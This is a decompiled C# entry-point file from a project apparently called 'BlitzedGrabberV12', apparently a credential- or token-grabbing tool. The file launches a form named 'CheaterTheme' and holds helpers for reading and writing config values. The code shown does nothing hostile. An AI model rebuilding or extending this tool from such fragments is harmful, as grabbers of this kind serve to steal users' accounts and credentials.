using System;
using System.Configuration;
using System.Diagnostics;
using System.Windows.Forms;
using BlitzedGrabberV12.Forms;

namespace BlitzedGrabberV12
{
	// Token: 0x02000002 RID: 2
	internal static class Program
	{
		// Token: 0x06000002 RID: 2 RVA: 0x00002057 File Offset: 0x00000257
		[STAThread]
		private static void Main()
		{
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run(new CheaterTheme());
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002070 File Offset: 0x00000270
		public static void SetValue(string key, string value)
		{
			Configuration configuration = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
			KeyValueConfigurationCollection settings = configuration.AppSettings.Settings;
			if (settings[key] == null)
			{
				settings.Add(key, value);
			}
			else
			{
				settings[key].Value = value;
			}
			configuration.Save(ConfigurationSaveMode.Modified);
			ConfigurationManager.RefreshSection(configuration.AppSettings.SectionInformation.Name);
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000020CA File Offset: 0x000002CA
		public static string GetValue(string key)
		{
			return ConfigurationManager.AppSettings[key];
		}

		// Token: 0x04000001 RID: 1
		public static string fileName = Process.GetCurrentProcess().ProcessName;
	}
}
